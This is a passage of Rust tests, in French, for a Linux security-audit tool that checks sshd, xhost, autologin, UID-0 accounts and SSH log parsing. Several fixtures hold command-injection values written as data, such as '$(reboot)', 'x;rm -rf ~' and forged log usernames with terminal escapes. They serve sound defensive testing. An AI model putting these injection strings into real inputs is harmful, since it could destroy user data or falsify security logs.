        // Fichier listé qui ne se retrouve pas à la lecture (lien cassé) : non vérifié.
        symlink("parti", racine.join("etc/sddm.conf.d/z.conf")).unwrap();
        let vus: Vec<_> = fichiers_de_connexion(&racine).iter().map(court).collect();
        assert!(vus.contains(&("/etc/sddm.conf.d/z.conf".to_string(), false)), "{vus:?}");
        // Dossier qui ne s'ouvre pas (lien en boucle) : non vérifié.
        std::fs::create_dir_all(racine.join("etc/lightdm")).unwrap();
        symlink("lightdm.conf.d", racine.join("etc/lightdm/lightdm.conf.d")).unwrap();
        let vus: Vec<_> = fichiers_de_connexion(&racine).iter().map(court).collect();
        assert!(
            vus.contains(&("/etc/lightdm/lightdm.conf.d".to_string(), false)),
            "{vus:?}"
        );
        // Plus de fichiers qu'on n'en lit : le dossier est non vérifié, pas lu à moitié en silence.
        let gros = racine.join("usr/share/lightdm/lightdm.conf.d");
        std::fs::create_dir_all(&gros).unwrap();
        for i in 0..=CONNEXION_FICHIERS_MAX {
            std::fs::write(gros.join(format!("{i:04}.conf")), "").unwrap();
        }
        let vus: Vec<_> = fichiers_de_connexion(&racine).iter().map(court).collect();
        assert!(
            vus.contains(&("/usr/share/lightdm/lightdm.conf.d".to_string(), false)),
            "{:?}",
            vus.iter().filter(|v| !v.1).collect::<Vec<_>>()
        );
        // Et le constat les dit tous non vérifiés, à côté de l'ouverture vue.
        let c = constat_d_ouverture(&fichiers_de_connexion(&racine), || Some(false)).unwrap();
        assert_eq!(c.probleme, Some(Niveau::Moyen), "{}", c.message);
        assert!(c.message.contains(tr!("non vérifiés", "not checked")), "{}", c.message);
    }

    /// D7a : un compte caché à l'UID 0 se verrouille par un geste (jamais supprimé) ; un nom forgé laisse la liste
    /// entière à la main.
    #[test]
    fn comptes_uid0_verrouilles() {
        let passwd =
            "root:x:0:0::/root:/bin/bash\ntoor:x:0:0::/root:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/bash\n";
        let k = juger_comptes(passwd).correctif.unwrap();
        assert!(k.automatique);
        let [ligne] = k.commandes.as_slice() else {
            panic!("un geste attendu")
        };
        assert!(matches!(
            gestes_unix::analyser(ligne),
            Some(GesteUnix::Defense(Defense::VerrouillerCompte(n), _)) if n.as_str() == "toor"
        ));
        assert!(juger_comptes("root:x:0:0::/root:/bin/bash\n").correctif.is_none());
        let forge = "toor:x:0:0::/root:/bin/sh\n$(reboot):x:0:0::/:/bin/sh\n";
        let k = juger_comptes(forge).correctif.unwrap();
        assert!(!k.automatique);
        assert!(k.commandes.iter().all(|c| !gestes_unix::a_le_prefixe(c)));
    }

    #[test]
    fn affichage_x11_ouvert() {
        // Contrôle actif, seul le compte local : rien.
        assert!(
            juger_xhost("access control enabled, only authorized clients can connect\nSI:localuser:alice\n").is_none()
        );
        assert!(juger_xhost("").is_none());
        // « xhost + » : tout le monde.
        let ouvert =
            juger_xhost("access control disabled, clients can connect from any host\nSI:localuser:alice\n").unwrap();
        assert_eq!(ouvert.probleme, Some(Niveau::Eleve));
        assert_eq!(ouvert.correctif.unwrap().commandes, ["xhost -"]);
        // Des ordinateurs permis : chacun sa commande, sauf un nom piégé (montré inoffensif, pas dans une commande).
        let hotes = juger_xhost(
            "access control enabled, only authorized clients can connect\nINET:192.168.1.20\nportable\nINET:x;rm -rf ~\nSI:localuser:alice\n",
        )
        .unwrap();
        assert_eq!(hotes.probleme, Some(Niveau::Moyen));
        assert_eq!(
            hotes.correctif.unwrap().commandes,
            ["xhost -INET:192.168.1.20", "xhost -portable"]
        );
    }

    #[test]
    fn cups_browsed_au_reseau() {
        let c = cups_browsed_expose();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert_eq!(
            c.correctif.unwrap().commandes,
            ["vanguard:geste unite desactiver cups-browsed.service"]
        );
        // Nommé par son groupe de contrôle quand le programme est invisible sans droits.
        assert_eq!(
            service_du_groupe("/system.slice/cups-browsed.service").as_deref(),
            Some("cups-browsed")
        );
    }

    #[test]
    fn ssh_sans_mot_de_passe() {
        assert!(mots_de_passe_vides_sshd("PermitEmptyPasswords yes\n"));
        assert!(mots_de_passe_vides_sshd(
            "permitemptypasswords=yes\nPermitEmptyPasswords no\n"
        ));
        // La première valeur compte ; mots de passe coupés, la ligne ne sert à rien.
        assert!(!mots_de_passe_vides_sshd(
            "PermitEmptyPasswords no\nPermitEmptyPasswords yes\n"
        ));
        assert!(!mots_de_passe_vides_sshd(
            "PasswordAuthentication no\nKbdInteractiveAuthentication no\nPermitEmptyPasswords yes\n"
        ));
        assert!(!mots_de_passe_vides_sshd(""));
    }

    #[test]
    fn reseau_ouvert_ou_protege() {
        let ouvert = "connection.id:Gare\nconnection.type:802-11-wireless\n802-11-wireless.ssid:Gare\n";
        assert!(wifi_ouvert(ouvert));
        assert!(wifi_ouvert("802-11-wireless-security.key-mgmt:\n"));
        assert!(wifi_ouvert("802-11-wireless-security.key-mgmt:--\n"));
        assert!(!wifi_ouvert(
            "802-11-wireless-security.key-mgmt:wpa-psk\n802-11-wireless-security.psk:<hidden>\n"
        ));
        assert!(!wifi_ouvert("802-11-wireless-security.key-mgmt:owe\n"));
        assert!(!wifi_ouvert("802-11-wireless-security.key-mgmt:none\n"));
    }

    #[test]
    fn connexions_wifi_qui_se_reconnectent() {
        let sortie = "\
0b6f1a2c-3d4e-4f50-8a9b-0c1d2e3f4a5b:802-11-wireless:yes:Hôtel : accueil
1b6f1a2c-3d4e-4f50-8a9b-0c1d2e3f4a5b:802-11-wireless:no:Maison
2b6f1a2c-3d4e-4f50-8a9b-0c1d2e3f4a5b:802-3-ethernet:yes:Filaire
pas-un-uuid;rm -rf ~:802-11-wireless:yes:Piège
";
        assert_eq!(
            connexions_wifi_auto(sortie),
            [(
                "0b6f1a2c-3d4e-4f50-8a9b-0c1d2e3f4a5b".to_string(),
                "Hôtel : accueil".to_string()
            )]
        );
    }

    #[test]
    fn retrait_selon_la_distribution() {
        assert_eq!(
            Paquets::Pacman.commande_retrait(false, None, "'anydesk'"),
            "sudo pacman -Rns --noconfirm 'anydesk'"
        );
        assert_eq!(
            Paquets::Pacman.commande_retrait(true, None, "'anydesk'"),
            "omarchy pkg drop 'anydesk'"
        );
        assert_eq!(
            Paquets::Apt.commande_retrait(false, None, "x"),
            "sudo apt-get remove -y x"
        );
        assert_eq!(Paquets::Dnf.commande_retrait(false, None, "x"), "sudo dnf remove -y x");
        // Bazzite, Silverblue : dnf n'y retire rien, le paquet superposé part de l'image suivante.
        assert!(
            Paquets::Dnf
                .commande_retrait(false, Some(Atomique::RpmOstree), "x")
                .starts_with("sudo rpm-ostree uninstall x && echo")
        );
        assert!(
            Paquets::Zypper
                .commande_retrait(false, Some(Atomique::Transactionnel), "x")
                .starts_with("sudo transactional-update --non-interactive pkg remove x && echo")
        );
        assert_eq!(
            Paquets::Zypper.commande_retrait(false, None, "x"),
            "sudo zypper --non-interactive remove x"
        );
    }

    #[test]
    fn reglages_secondaires_de_sshd() {
        assert!(juger_ssh_secondaire("").is_none());
        assert!(juger_ssh_secondaire("X11Forwarding no\nMaxAuthTries 6\n").is_none());
        let c = juger_ssh_secondaire("X11Forwarding yes\nMaxAuthTries 10\n").unwrap();
        assert_eq!(c.probleme, Some(Niveau::Info));
        let commandes = c.correctif.unwrap().commandes;
        assert!(commandes[0].starts_with("echo 'X11Forwarding no' | sudo tee -a"));
        assert!(commandes[1].starts_with("echo 'MaxAuthTries 6' | sudo tee -a"));
        assert_eq!(commandes[2], RECHARGER_SSHD);
    }

    /// Chaque réglage dangereux de sshd est corrigé par un geste de défense, rejugé par l'enfant root (jamais une
    /// commande du bilan) ; sans clé autorisée, couper les mots de passe reste à la main.
    #[test]
    fn serveur_ssh_par_gestes() {
        use crate::machine::gestes_unix::{self, Defense, GesteUnix, ReglageSsh};
        let geste = |c: Constat| {
            let k = c.correctif.unwrap();
            assert!(k.automatique);
            assert!(
                matches!(k.defaire, crate::machine::Defaire::Gestes(_)),
                "{:?}",
                k.defaire
            );
            let [ligne] = k.commandes.as_slice() else {
                panic!("une seule ligne : {:?}", k.commandes)
            };
            match gestes_unix::analyser(ligne) {
                Some(GesteUnix::Defense(Defense::DurcirSsh(r), _)) => r,
                _ => panic!("geste de défense attendu : {ligne}"),
            }
        };
        let base = "passwordauthentication yes\nkbdinteractiveauthentication yes\n";
        let c = juger_ssh_serveur(&format!("permitemptypasswords yes\n{base}"), true);
        assert_eq!(c.probleme, Some(Niveau::Critique));
        assert_eq!(geste(c), ReglageSsh::MotsDePasseVides);
        let c = juger_ssh_serveur(&format!("permitrootlogin yes\n{base}"), false);
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert_eq!(geste(c), ReglageSsh::Root);
        assert_eq!(geste(juger_ssh_serveur(base, true)), ReglageSsh::MotsDePasse);
        let k = juger_ssh_serveur(base, false).correctif.unwrap();
        assert!(!k.automatique && k.action.contains("ssh-copy-id"));
        let c = juger_ssh_serveur(
            "permitrootlogin prohibit-password\npasswordauthentication no\nkbdinteractiveauthentication no\n",
            true,
        );
        assert!(c.probleme.is_none() && c.correctif.is_none());
    }

    #[test]
    fn conseil_selon_le_bloqueur() {
        // Sans bloqueur : l'installer ; avec, rien de plus, sauf fermer le port ouvert vers Internet.
        assert!(conseil_echecs_ssh(false, false).unwrap().contains("sshguard"));
        assert!(conseil_echecs_ssh(true, false).is_none());
        let internet = conseil_echecs_ssh(true, true).unwrap();
        assert!(!internet.contains("sshguard") && internet.contains("routeur"));
        let tout = conseil_echecs_ssh(false, true).unwrap();
        assert!(tout.contains("sshguard") && tout.contains("routeur"));
    }

    #[test]
    fn ports_renvoyes_par_ssh() {
        assert!(juger_ports_ssh("").is_none() && juger_ports_ssh("GatewayPorts no\n").is_none());
        for ouvert in ["GatewayPorts yes\n", "gatewayports=clientspecified\n"] {
            let c = juger_ports_ssh(ouvert).unwrap();
            assert_eq!(c.probleme, Some(Niveau::Moyen));
            assert!(c.correctif.unwrap().commandes[0].contains("'GatewayPorts no'"));
        }
    }

    #[test]
    fn configuration_de_sshd() {
        let conf = |t: &str| super::super::unix::partie_globale_sshd(t);
        // Valeur explicite, avec « = » ou des guillemets.
        assert!(!mots_de_passe_sshd(&conf("PasswordAuthentication no\nUsePAM no\n")));
        assert!(!mots_de_passe_sshd(&conf("PasswordAuthentication=no\n")));
        assert_eq!(
            valeur_sshd("PermitRootLogin \"yes\"\n", "permitrootlogin").as_deref(),
            Some("yes")
        );
        // Rien d'écrit : le mot de passe est permis par défaut.
        assert!(mots_de_passe_sshd(&conf("# PasswordAuthentication no\n")));
        // Avec PAM, le clavier interactif redemande le mot de passe s'il n'est pas coupé aussi.
        assert!(mots_de_passe_sshd(&conf("PasswordAuthentication no\nUsePAM yes\n")));
        assert!(!mots_de_passe_sshd(&conf(
            "PasswordAuthentication no\nKbdInteractiveAuthentication no\nUsePAM yes\n"
        )));
        assert!(!mots_de_passe_sshd(&conf(
            "PasswordAuthentication no\nChallengeResponseAuthentication no\nUsePAM yes\n"
        )));
        // Un bloc Match ne vaut que pour certaines connexions : il ne compte pas comme réglage général.
        let avec_match = "PasswordAuthentication no\nMatch User invite\n  PermitRootLogin yes\n";
        assert_eq!(valeur_sshd(&conf(avec_match), "PermitRootLogin"), None);
        assert!(!mots_de_passe_sshd(&conf(avec_match)));
    }

    #[test]
    fn service_d_un_groupe() {
        assert_eq!(
            service_du_groupe("/system.slice/passim.service").as_deref(),
            Some("passim")
        );
        assert_eq!(service_du_groupe("/user.slice/user-1000.slice/session-2.scope"), None);
        assert_eq!(service_du_groupe("/"), None);
    }

    #[test]
    fn familles_de_distributions() {
        let f = |t: &str| famille(t);
        assert!(f("ID=arch\n") == Some(Paquets::Pacman));
        assert!(f("NAME=\"Manjaro Linux\"\nID=manjaro\nID_LIKE=arch\n") == Some(Paquets::Pacman));
        assert!(f("ID=cachyos\nID_LIKE=\"arch\"\n") == Some(Paquets::Pacman));
        assert!(f("ID=debian\nVERSION_ID=\"12\"\n") == Some(Paquets::Apt));
        assert!(f("ID=linuxmint\nID_LIKE=\"ubuntu debian\"\n") == Some(Paquets::Apt));
        assert!(f("ID=pop\nID_LIKE=\"ubuntu debian\"\n") == Some(Paquets::Apt));
        assert!(f("ID=fedora\nVARIANT_ID=kinoite\n") == Some(Paquets::Dnf));
        assert!(f("ID=bazzite\nID_LIKE=\"fedora\"\n") == Some(Paquets::Dnf));
        assert!(f("ID=\"rocky\"\nID_LIKE=\"rhel centos fedora\"\n") == Some(Paquets::Dnf));
        assert!(f("ID=\"opensuse-tumbleweed\"\nID_LIKE=\"opensuse suse\"\n") == Some(Paquets::Zypper));
        assert!(f("ID=alpine\n").is_none());
        // VERSION_ID ne doit pas passer pour ID.
        assert!(f("VERSION_ID=arch\n").is_none());
    }

    #[test]
    fn racine_en_lecture_seule() {
        assert!(racine_lecture_seule(
            "/dev/vda3 / btrfs ro,relatime,ssd,subvol=/@/.snapshots/5/snapshot 0 0\n/dev/vda3 /var btrfs rw 0 0\n"
        ));
        assert!(!racine_lecture_seule(
            "/dev/nvme0n1p2 / btrfs rw,noatime 0 0\nproc /proc proc ro 0 0\n"
        ));
        // Dernier montage sur / : c'est lui qui compte.
        assert!(!racine_lecture_seule("none / rootfs ro 0 0\n/dev/sda1 / ext4 rw 0 0\n"));
    }

    #[test]
    fn failles_du_processeur() {
        let etats = vec![
            ("meltdown".to_string(), "Not affected\n".to_string()),
            ("spectre_v2".to_string(), "Mitigation: Enhanced IBRS\n".to_string()),
            (
                "mds".to_string(),
                "Vulnerable: Clear CPU buffers attempted, no microcode\n".to_string(),
            ),
        ];
        assert_eq!(failles_vulnerables(&etats), vec!["mds"]);
    }

    #[test]
    fn reglage_remote_play() {
        assert_eq!(enable_streaming("\t\t\"EnableStreaming\"\t\t\"0\"\n"), Some(false));
        assert_eq!(
            enable_streaming("\"x\" \"y\"\n\t\"EnableStreaming\"\t\"1\""),
            Some(true)
        );
        assert_eq!(enable_streaming("\"Autre\"\t\"1\""), None);
    }

    #[test]
    fn tentatives_ssh_ratees() {
        let journal = "Invalid user admin from 203.0.113.5 port 52314
Failed password for invalid user admin from 203.0.113.5 port 52314 ssh2
Connection closed by invalid user admin 203.0.113.5 port 52314 [preauth]
Failed password for root from 198.51.100.7 port 41122 ssh2
Failed password for root from 198.51.100.7 port 41122 ssh2
error: maximum authentication attempts exceeded for root from 198.51.100.7 port 41122 ssh2 [preauth]
Failed keyboard-interactive/pam for alice from 2001:db8::5 port 40000 ssh2
pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.5
Accepted publickey for alice from 10.0.0.12 port 50000 ssh2
Failed password for alice from 10.0.0.12 port 50001 ssh2";
        let (n, adresses) = echecs_ssh(journal);
        // Lus dans les fichiers du journal, un message par entrée : la même chose que la sortie de journalctl.
        let messages: Vec<String> = journal.lines().map(str::to_string).collect();
        assert_eq!(comme_journalctl_cat(&messages), format!("{journal}\n"));
        assert_eq!(echecs_ssh(&comme_journalctl_cat(&messages)), (n, adresses.clone()));
        assert_eq!(n, 4);
        assert_eq!(adresses.len(), 4);
        assert_eq!(adresses.iter().filter(|ip| d_internet(ip)).count(), 3);
        assert_eq!(niveau_echecs_ssh(4, true, true), None);
        assert_eq!(niveau_echecs_ssh(30, true, true), Some(Niveau::Eleve));
        assert_eq!(niveau_echecs_ssh(30, false, true), Some(Niveau::Moyen));
        assert_eq!(niveau_echecs_ssh(30, true, false), Some(Niveau::Info));
    }

    /// Le nom d'utilisateur tenté vient de l'attaquant, et sshd l'écrit tel quel (espaces compris) avant l'adresse :
    /// « from 192.168.1.5 port 1 » glissé dans le nom faisait passer une attaque venue d'Internet pour une tentative du
    /// réseau local, moins grave. L'adresse et le port lus sont ceux que sshd écrit en dernier ; d'un nom piégé, rien
    /// d'autre n'est gardé que des nombres et des adresses validées.
    #[test]
    fn nom_d_utilisateur_piege_dans_le_journal_ssh() {
        let journal = "Invalid user x from 192.168.1.5 port 1 from 203.0.113.5 port 52314\n\
                       Failed password for invalid user x from 192.168.1.5 port 1 from 203.0.113.5 port 52314 ssh2\n\
                       Invalid user \x1b]52;c;eA==\x07\x1b[2K\r\u{202e} from 198.51.100.7 port 41122\n";
        let (n, adresses) = echecs_ssh(journal);
        let ip = |t: &str| t.parse::<std::net::IpAddr>().unwrap();
        assert_eq!(n, 2);
        assert_eq!(
            adresses.into_iter().collect::<Vec<_>>(),
            [ip("198.51.100.7"), ip("203.0.113.5")]
        );
        assert_eq!(
            niveau_echecs_ssh(30, d_internet(&ip("203.0.113.5")), true),
            Some(Niveau::Eleve)
        );
    }

    /// Un mot de passe deviné : dix échecs depuis une adresse, puis une connexion acceptée depuis la même. La connexion
    /// d'un compte qui n'existe pas compte une fois, ou pas du tout quand ses mots de passe ratés la comptent déjà ; un
    /// faux « Accepted » glissé dans un nom d'utilisateur tenté n'est pas une connexion.
    #[test]
    fn mot_de_passe_ssh_devine() {
        use crate::machine::chasse::{Intrusion, intrusions};
        let mut journal = String::new();
        for port in 40000..40004 {
            writeln!(journal, "Invalid user admin from 203.0.113.5 port {port}").unwrap();
            for _ in 0..2 {
                writeln!(
                    journal,
                    "Failed password for invalid user admin from 203.0.113.5 port {port} ssh2"
                )
                .unwrap();
            }
        }
        journal += "Invalid user test from 203.0.113.5 port 41000\n\
                    Connection closed by invalid user test 203.0.113.5 port 41000 [preauth]\n";
        // Neuf échecs : une connexion acceptée n'est pas encore suspecte.
        journal += "Accepted password for alice from 203.0.113.5 port 42000 ssh2\n";
        // Le dixième, avec un faux « Accepted » dans le nom tenté.
        journal += "Invalid user Accepted password for root from 203.0.113.5 port 1 from 203.0.113.5 port 41001\n";
        journal += "Accepted publickey for alice from 203.0.113.5 port 42001 ssh2: ED25519 SHA256:abc\n";
        // Ailleurs : des échecs sans réussite, une réussite après un seul échec.
        journal += &"Failed password for root from 198.51.100.7 port 50000 ssh2\n".repeat(12);
        journal += "Failed password for alice from 10.0.0.12 port 50001 ssh2\n\
                    Accepted password for alice from 10.0.0.12 port 50002 ssh2\n";
        let t = tentatives_ssh(&journal);
        assert_eq!(t.iter().filter(|t| t.reussie).count(), 3);
        assert_eq!(t.iter().filter(|t| !t.reussie).count(), 10 + 12 + 1);
        assert_eq!(
            intrusions(&t),
            [Intrusion {
                adresse: "203.0.113.5".parse().unwrap(),
                compte: "alice".into(),
                echecs: 10
            }]
        );
    }

    #[test]
    fn minuteries_de_sauvegarde() {
        assert_eq!(type_sauvegarde("backup-home.timer"), Some(true));
        assert_eq!(type_sauvegarde("restic-nuit.timer"), Some(true));
        assert_eq!(type_sauvegarde("snapper-timeline.timer"), Some(false));
        assert_eq!(type_sauvegarde("snapper-cleanup.timer"), None);
        assert_eq!(type_sauvegarde("fstrim.timer"), None);
    }

    #[test]
    fn politique_du_pare_feu() {
        assert_eq!(
            politique_ufw("# commentaire\nDEFAULT_INPUT_POLICY=\"DROP\"\n").as_deref(),
            Some("DROP")
        );
        assert_eq!(
            politique_ufw("DEFAULT_INPUT_POLICY=\"accept\"").as_deref(),
            Some("ACCEPT")
        );
        assert_eq!(politique_ufw("rien"), None);
    }

    /// Coupé par votre choix (P9) : une information avec un niveau (les ports ouverts restent dits sans pare-feu),
    /// vérifiée, et « Rallumer » proposé à la main, jamais fait d'office.
    #[test]
    fn pare_feu_coupe_par_votre_choix() {
        use crate::machine::gestes_unix::PareFeu;
        for p in PareFeu::TOUS {
            let c = par_votre_choix(&[(p, 1_762_400_000)]);
            assert_eq!(c.probleme, Some(Niveau::Info));
            assert!(c.verifie);
            assert!(c.message.contains(p.mot()));
            // nftables : sans droits root, seule la note le dit (relecture de D7c, B4).
            assert_eq!(
                c.message.contains("note de Vanguard"),
                p == PareFeu::Nftables,
                "{}",
                c.message
            );
            let k = c.correctif.expect("Rallumer proposé");
            assert!(!k.automatique);
            assert_eq!(
                k.commandes,
                [format!("vanguard options-defense --rallumer pare-feu-{}", p.mot())]
            );
        }
        // Deux coupures à la fois : les deux nommées, un Rallumer pour chacune (relecture de D7c, B2).
        let c = par_votre_choix(&[(PareFeu::Ufw, 1_762_400_000), (PareFeu::Firewalld, 1_762_500_000)]);
        assert!(
            c.message.contains("ufw") && c.message.contains("firewalld"),
            "{}",
            c.message
        );
        assert_eq!(
            c.correctif.expect("Rallumer proposé").commandes,
            [
                "vanguard options-defense --rallumer pare-feu-ufw",
                "vanguard options-defense --rallumer pare-feu-firewalld"
            ]
        );
    }

    #[test]
    fn delai_respecte() {
        let debut = std::time::Instant::now();
        assert!(sortie_delai("sleep", &["5"], 1, &[0]).is_none());
        assert!(debut.elapsed().as_secs() < 3);
        assert_eq!(
            sortie_delai("echo", &["bonjour"], 5, &[0]).as_deref(),
            Some("bonjour\n")
        );
        // Une commande en échec n'est jamais une réponse, sauf code explicitement accepté.
        assert!(sortie_delai("sh", &["-c", "echo rien; exit 1"], 5, &[0]).is_none());
        assert_eq!(sortie_delai("sh", &["-c", "exit 1"], 5, &[0, 1]).as_deref(), Some(""));
    }
}

/// Les lecteurs de fichiers et de sorties ajoutés au bilan Linux, sur des entrées au hasard (pièges compris) : jamais
/// de plantage, et rien de dangereux n'entre dans une commande.
#[cfg(test)]
mod tests_au_hasard {
    use super::*;
    use proptest::prelude::*;

    fn texte() -> impl Strategy<Value = String> {
        prop::collection::vec(
            prop_oneof![
                any::<String>(),
                "[ -~\\t\u{1b}\u{202e}é:=\\[\\]#;|\"]{0,60}",
                "(\\[(daemon|Autologin|Seat:\\*|commands)\\]|(User|AutomaticLogin|AutomaticLoginEnable|autologin-user|apply_updates) ?= ?[ -~]{0,20})",
            ],
            0..12,
        )
        .prop_map(|l| l.join("\n"))
    }

    proptest! {
        #![proptest_config(ProptestConfig { cases: 256, failure_persistence: None, ..ProptestConfig::default() })]

        #[test]
        fn lecteurs_sans_plantage(t in texte(), chemin in "(/etc/gdm3/custom.conf|/etc/sddm.conf|/etc/lightdm/lightdm.conf|/x)") {
            let _ = valeur_ini(&t, |_| true, "User");
            let _ = ouverture_automatique_de(&[super::tests::connexion(&chemin, &t)]);
            let _ = annulations_non_sures(&[super::tests::connexion(&chemin, &t), super::tests::connexion(&chemin, &t)]);
            let _ = proprietaires_pacman(&t);
            let _ = wifi_ouvert(&t);
            let _ = maj::juger_dnf_auto(false, true, &t);
        }

        #[test]
        fn uuid_sur_dans_la_commande(t in texte()) {
            // L'UUID entre tel quel dans « nmcli connection modify … » : toujours sa forme exacte.
            for (uuid, _) in connexions_wifi_auto(&t) {
                prop_assert_eq!(uuid.len(), 36);
                prop_assert!(uuid.chars().all(|c| c.is_ascii_hexdigit() || c == '-'));
            }
        }

        #[test]
        fn commandes_xhost_sures(t in texte()) {
            if let Some(c) = juger_xhost(&t)
                && let Some(k) = c.correctif
            {
                for commande in &k.commandes {
                    let reste = commande.strip_prefix("xhost -").unwrap_or_default();
                    prop_assert!(reste.chars().all(|c| c.is_ascii_alphanumeric() || ".:-_[]".contains(c)));
                }
            }
        }
    }
}
